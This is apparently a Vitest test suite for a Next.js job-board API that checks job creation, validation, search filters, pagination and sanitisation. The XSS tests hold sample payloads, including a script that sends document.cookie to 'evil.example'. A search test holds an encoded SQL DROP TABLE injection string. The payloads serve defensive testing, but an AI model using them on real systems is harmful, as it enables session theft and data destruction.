import { NextRequest } from "next/server";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { ApiErrorBody } from "@/lib/api-handler";
import { fakePrisma, fakePrismaRows, resetFakePrisma } from "../helpers/fake-prisma";

vi.mock("@/lib/db", () => import("../helpers/fake-prisma").then((module) => ({ prisma: module.fakePrisma })));

import { GET, POST } from "@/app/api/jobs/route";
import { buildJobFromRequest } from "@/lib/jobs/build-job";
import { createJob } from "@/lib/jobs/repository";

const ctx = { params: Promise.resolve({}) };

function post(body: unknown, headers: Record<string, string> = { "content-type": "application/json" }) {
  return POST(
    new NextRequest("http://localhost/api/jobs", {
      method: "POST",
      headers,
      body: typeof body === "string" ? body : JSON.stringify(body),
    }),
    ctx,
  );
}

function get(query = "") {
  return GET(new NextRequest(`http://localhost/api/jobs${query}`), ctx);
}

async function errorOf(res: Response): Promise<ApiErrorBody["error"]> {
  return ((await res.json()) as ApiErrorBody).error;
}

const structured = {
  mode: "structured",
  title: "Senior Backend Engineer",
  company: "Acme AB",
  location: "Stockholm",
  country: "Sweden",
  roleCategory: "SOFTWARE_ENGINEER",
  workMode: "HYBRID",
  seniority: "SENIOR",
  employmentType: "FULL_TIME",
  description: "Build APIs with TypeScript and PostgreSQL.\n\nRequirements:\n- 5 years of Node.js\n- Docker",
  skills: [],
  applyUrl: "https://example.com/apply",
} as const;

describe("POST /api/jobs", () => {
  beforeEach(() => {
    resetFakePrisma();
    vi.spyOn(console, "error").mockImplementation(() => undefined);
  });
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("creates a structured job, auto-detects skills when none are given, and returns 201", async () => {
    const res = await post(structured);
    expect(res.status).toBe(201);
    const { job } = (await res.json()) as { job: Record<string, unknown> };
    expect(res.headers.get("location")).toBe(`/jobs/${String(job["id"])}`);
    expect(job).toMatchObject({
      title: "Senior Backend Engineer",
      company: "Acme AB",
      roleCategory: "SOFTWARE_ENGINEER",
      workMode: "HYBRID",
      sourceName: "manual",
      applyUrl: "https://example.com/apply",
    });
    expect(job["skills"]).toEqual(expect.arrayContaining(["TypeScript", "PostgreSQL", "Node.js", "Docker"]));
    expect(job["requirements"]).toEqual(["5 years of Node.js", "Docker"]);
  });

  it("uses the skills the user typed (canonicalised) instead of auto-detecting", async () => {
    const res = await post({ ...structured, skills: ["reactjs", "Postgres", "reactjs", "  "] });
    const { job } = (await res.json()) as { job: { skills: string[] } };
    expect(job.skills).toEqual(["React", "PostgreSQL"]);
  });

  it("creates a job from a pasted raw posting and infers the fields", async () => {
    const res = await post({
      mode: "raw",
      title: "Senior Data Engineer",
      company: "Lumen",
      location: "Amsterdam",
      text: "<h2>About</h2><p>Hybrid role, 3 days in our Amsterdam office. Full-time.</p><ul><li>dbt</li><li>Airflow</li><li>Snowflake</li></ul>",
      url: "https://careers.example.com/jobs/42#apply",
    });
    expect(res.status).toBe(201);
    const { job } = (await res.json()) as { job: Record<string, unknown> };
    expect(job).toMatchObject({
      roleCategory: "DATA_ENGINEER",
      seniority: "SENIOR",
      workMode: "HYBRID",
      employmentType: "FULL_TIME",
      sourceName: "careers.example.com",
      sourceUrl: "https://careers.example.com/jobs/42",
    });
    expect(job["skills"]).toEqual(expect.arrayContaining(["dbt", "Apache Airflow", "Snowflake"]));
    expect(String(job["description"])).not.toContain("<");
  });

  describe("XSS", () => {
    const payloads = [
      `<script>alert(1)</script>`,
      `<img src=x onerror=alert(1)>`,
      `<svg onload=alert(1)>`,
      `&lt;script&gt;alert(1)&lt;/script&gt;`,
      `<a href="javascript:alert(1)">x</a>`,
    ];

    it.each(payloads)("never stores markup from any text field (%s)", async (payload) => {
      const res = await post({
        ...structured,
        title: `Engineer ${payload}`,
        company: `Acme ${payload}`,
        location: `Oslo ${payload}`,
        description: `Great job ${payload} with TypeScript`,
        skills: [`Rust ${payload}`],
      });
      expect(res.status).toBe(201);
      const stored = JSON.stringify(fakePrismaRows());
      expect(stored).not.toMatch(/<\/?[a-z!]/i);
      expect(stored.toLowerCase()).not.toContain("onerror");
    });

    it("never stores markup from a pasted raw posting", async () => {
      const res = await post({
        mode: "raw",
        title: "Backend Developer <b onmouseover=alert(1)>",
        company: "Evil <script>alert(1)</script> Corp",
        text: `<p>Python and SQL</p><script>fetch('//evil.example/'+document.cookie)</script><iframe src="javascript:alert(1)"></iframe>`,
      });
      expect(res.status).toBe(201);
      const stored = JSON.stringify(fakePrismaRows());
      expect(stored).not.toMatch(/<\/?[a-z!]/i);
      expect(stored).not.toContain("document.cookie");
    });

    it.each(["javascript:alert(1)", "data:text/html,<script>alert(1)</script>", "https://user:pw@example.com/"])(
      "rejects the unsafe link %s",
      async (link) => {
        const asRaw = await post({ mode: "raw", title: "Software Engineer", company: "Acme", text: "Some text", url: link });
        expect(asRaw.status).toBe(400);
        expect((await errorOf(asRaw)).details).toEqual([expect.objectContaining({ path: "url" })]);

        const asStructured = await post({ ...structured, applyUrl: link });
        expect(asStructured.status).toBe(400);
        expect((await errorOf(asStructured)).details).toEqual([expect.objectContaining({ path: "applyUrl" })]);
        expect(fakePrismaRows()).toHaveLength(0);
      },
    );
  });

  describe("validation", () => {
    it("returns field-level errors for a missing title", async () => {
      const res = await post({ ...structured, title: "   " });
      expect(res.status).toBe(400);
      const error = await errorOf(res);
      expect(error.code).toBe("VALIDATION_ERROR");
      expect(error.details).toEqual([expect.objectContaining({ path: "title" })]);
    });

    it("rejects a title that is only markup (nothing left after sanitising)", async () => {
      const res = await post({ ...structured, title: "<script>alert(1)</script>" });
      expect(res.status).toBe(400);
      expect((await errorOf(res)).details).toEqual([expect.objectContaining({ path: "title" })]);
    });

    it("explains a pasted link with no description", async () => {
      const res = await post({ mode: "raw", title: "Software Engineer", company: "Acme", text: "https://example.com/jobs/1" });
      expect(res.status).toBe(400);
      const [detail] = (await errorOf(res)).details as Array<{ path: string; message: string }>;
      expect(detail).toMatchObject({ path: "text" });
      expect(detail?.message).toContain("link");
    });

    it("asks for a role when the title does not reveal one", async () => {
      const res = await post({ mode: "raw", title: "Office Wizard", company: "Acme", text: "Do things" });
      expect(res.status).toBe(400);
      expect((await errorOf(res)).details).toEqual([expect.objectContaining({ path: "roleCategory" })]);

      const ok = await post({ mode: "raw", title: "Office Wizard", company: "Acme", text: "Do things", roleCategory: "PROJECT_MANAGER" });
      expect(ok.status).toBe(201);
    });

    it("rejects unknown enum values, bad salary ranges and unknown modes", async () => {
      expect((await post({ ...structured, roleCategory: "WIZARD" })).status).toBe(400);
      expect((await post({ ...structured, salaryMin: 200, salaryMax: 100 })).status).toBe(400);
      expect((await post({ ...structured, mode: "other" })).status).toBe(400);
    });

    it("rejects a wrong content type, malformed JSON and oversized bodies", async () => {
      expect((await post("title=x", { "content-type": "text/plain" })).status).toBe(415);
      expect((await post("{nope")).status).toBe(400);
      const huge = { mode: "raw", title: "Software Engineer", company: "Acme", text: "x".repeat(200_001) };
      expect((await post(huge)).status).toBe(400);
    });

    it("returns 409 for a duplicate job (same company, title and location)", async () => {
      expect((await post(structured)).status).toBe(201);
      const again = await post({ ...structured, title: "senior  backend engineer!", company: "ACME AB" });
      expect(again.status).toBe(409);
      expect((await errorOf(again)).code).toBe("CONFLICT");
      expect(fakePrismaRows()).toHaveLength(1);
    });
  });
});

describe("GET /api/jobs", () => {
  async function seed() {
    const base = { mode: "structured", company: "Acme", description: "Text", skills: [] as string[] } as const;
    const jobs = [
      { ...base, title: "Backend Engineer", location: "Stockholm", country: "Sweden", roleCategory: "SOFTWARE_ENGINEER", workMode: "HYBRID", skills: ["TypeScript", "PostgreSQL"], description: "APIs for fintech" },
      { ...base, title: "Product Manager", location: "Berlin", country: "Germany", roleCategory: "PRODUCT_MANAGER", workMode: "REMOTE", skills: ["Jira", "SQL"] },
      { ...base, title: "Data Engineer", location: "Stockholm", country: "Sweden", roleCategory: "DATA_ENGINEER", workMode: "ONSITE", skills: ["Python", "SQL", "TypeScript"] },
      { ...base, title: "Gameplay Programmer", location: "Malmö", country: "Sweden", roleCategory: "SOFTWARE_DEVELOPER", sector: "GAMING", skills: ["C#", "Unity"] },
    ] as const;
    for (const job of jobs) expect((await post(job)).status).toBe(201);
  }

  async function titles(query: string): Promise<string[]> {
    const res = await get(query);
    expect(res.status).toBe(200);
    return ((await res.json()) as { items: Array<{ title: string }> }).items.map((item) => item.title);
  }

  beforeEach(async () => {
    resetFakePrisma();
    vi.spyOn(console, "error").mockImplementation(() => undefined);
    await seed();
  });
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it("lists active jobs with totals", async () => {
    const body = (await (await get()).json()) as { total: number; page: number; totalPages: number; items: unknown[] };
    expect(body).toMatchObject({ total: 4, page: 1, totalPages: 1 });
    expect(body.items).toHaveLength(4);
  });

  it("returns list items with an excerpt and without the full description", async () => {
    const [first] = ((await (await get("?q=fintech")).json()) as { items: Array<Record<string, unknown>> }).items;
    expect(first).toBeDefined();
    expect(first).toHaveProperty("excerpt");
    expect(first).not.toHaveProperty("description");
  });

  it("filters by text search across title, company, location and description", async () => {
    expect(await titles("?q=fintech")).toEqual(["Backend Engineer"]);
    expect(await titles("?q=berlin")).toEqual(["Product Manager"]);
    expect(await titles("?q=acme%20engineer")).toEqual(expect.arrayContaining(["Backend Engineer", "Data Engineer"]));
    expect(await titles("?q=zzz")).toEqual([]);
  });

  it("filters by role type, work mode, sector and location", async () => {
    expect(await titles("?roleCategory=PRODUCT_MANAGER")).toEqual(["Product Manager"]);
    expect(await titles("?workMode=ONSITE")).toEqual(["Data Engineer"]);
    expect(await titles("?sector=GAMING")).toEqual(["Gameplay Programmer"]);
    expect((await titles("?location=stockholm")).sort()).toEqual(["Backend Engineer", "Data Engineer"]);
    expect((await titles("?location=sweden")).sort()).toEqual(["Backend Engineer", "Data Engineer", "Gameplay Programmer"]);
  });

  it("requires ALL selected skills, case-insensitively, repeated or comma separated", async () => {
    expect((await titles("?skill=sql")).sort()).toEqual(["Data Engineer", "Product Manager"]);
    expect(await titles("?skill=SQL&skill=TypeScript")).toEqual(["Data Engineer"]);
    expect(await titles("?skill=SQL,TypeScript")).toEqual(["Data Engineer"]);
    expect(await titles("?skill=Unity&skill=SQL")).toEqual([]);
  });

  it("combines filters and ignores empty form fields", async () => {
    expect(await titles("?q=&roleCategory=&workMode=&location=stockholm&skill=TypeScript&sector=")).toHaveLength(2);
    expect(await titles("?location=stockholm&skill=TypeScript&workMode=ONSITE")).toEqual(["Data Engineer"]);
  });

  it("paginates", async () => {
    const page1 = (await (await get("?pageSize=3")).json()) as { items: unknown[]; totalPages: number; total: number };
    expect(page1).toMatchObject({ total: 4, totalPages: 2 });
    expect(page1.items).toHaveLength(3);
    const page2 = (await (await get("?pageSize=3&page=2")).json()) as { items: unknown[] };
    expect(page2.items).toHaveLength(1);
  });

  it("sorts newest first, with undated jobs last", async () => {
    resetFakePrisma();
    const make = (title: string, postedAt?: Date) => {
      const { postedAt: _now, ...job } = buildJobFromRequest({
        mode: "structured",
        title,
        company: "Acme",
        roleCategory: "SOFTWARE_ENGINEER",
        sector: "TECH",
        workMode: "UNKNOWN",
        seniority: "UNKNOWN",
        employmentType: "UNKNOWN",
        description: "Text",
        skills: [],
      });
      return postedAt ? { ...job, postedAt } : job;
    };
    await createJob(make("Undated"));
    await createJob(make("Oldest", new Date("2026-01-01")));
    await createJob(make("Newest", new Date("2026-10-01")));
    await createJob(make("Middle", new Date("2026-05-01")));
    expect(await titles("")).toEqual(["Newest", "Middle", "Oldest", "Undated"]);
  });

  it("rejects invalid filters with 400 instead of ignoring them", async () => {
    const res = await get("?roleCategory=WIZARD");
    expect(res.status).toBe(400);
    expect((await errorOf(res)).details).toEqual([expect.objectContaining({ path: "roleCategory" })]);
    expect((await get("?page=0")).status).toBe(400);
    expect((await get("?pageSize=1000")).status).toBe(400);
  });

  it("does not execute SQL or wildcards from the search box", async () => {
    expect(await titles("?q=%27%3B%20DROP%20TABLE%20jobs%3B--")).toEqual([]);
    expect(await titles("")).toHaveLength(4);
    expect(fakePrisma.job).toBeDefined();
  });
});
